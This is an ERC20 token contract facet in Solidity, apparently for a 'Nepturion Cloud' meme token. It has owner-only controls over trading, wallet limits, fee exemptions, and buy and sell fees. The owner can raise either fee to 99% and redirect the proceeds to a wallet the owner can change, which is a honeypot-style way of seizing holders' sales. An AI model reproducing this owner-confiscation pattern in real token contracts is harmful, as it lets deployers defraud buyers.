/*

    Website: https://www.nepturion.cloud/
    Try App: https://www.nepturion.cloud/auth
    Docs: https://docs.nepturion.cloud/
    Telegram: https://t.me/nepturioncloud
    X: https://x.com/NepturionCloud
    YouTube: https://www.youtube.com/@NepturionCloud
    GitHub: https://github.com/Nepturion-Cloud

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract enableTradingFacet is ERC20, Ownable {
    using SafeMath for uint256;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event DevWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingActive, "Trading live");
        ds.tradingActive = true;
        ds.swapEnabled = true;
    }
    function removeLimits() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        ds.swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set ds.maxTransactionAmount lower than 0.1%"
        );
        ds.maxTransactionAmount = newNum * (10 ** 18);
    }
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set ds.maxWallet lower than 0.5%"
        );
        ds.maxWallet = newNum * (10 ** 18);
    }
    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedMaxTransactionAmount[updAds] = isEx;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function updateBuyFees(uint256 _devFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyDevFee = _devFee;
        require(ds.buyDevFee <= 99);
    }
    function updateSellFees(uint256 _devFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellDevFee = _devFee;
        require(ds.sellDevFee <= 99);
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapV2Pair,
            "The pair cannot be removed from ds.automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
    function updateDevWallet(address newDevWallet) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit DevWalletUpdated(newDevWallet, ds.devWallet);
        ds.devWallet = newDevWallet;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                //when buy
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Buy transfer amount exceeds the ds.maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Sell transfer amount exceeds the ds.maxTransactionAmount."
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= ds.swapTokensAtAmount;

        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            ds.swapping = true;

            swapBack();

            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (ds.automatedMarketMakerPairs[to] && ds.sellDevFee > 0) {
                fees = amount.mul(ds.sellDevFee).div(100);
                ds.tokensForDev += fees;
            }
            // on buy
            else if (ds.automatedMarketMakerPairs[from] && ds.buyDevFee > 0) {
                fees = amount.mul(ds.buyDevFee).div(100);
                ds.tokensForDev += fees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        bool success;

        if (contractBalance == 0 || ds.tokensForDev == 0) {
            return;
        }

        if (contractBalance > ds.swapTokensAtAmount * 20) {
            contractBalance = ds.swapTokensAtAmount * 20;
        }
        swapTokensForEth(contractBalance);

        (success, ) = address(ds.devWallet).call{value: address(this).balance}(
            ""
        );
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
}
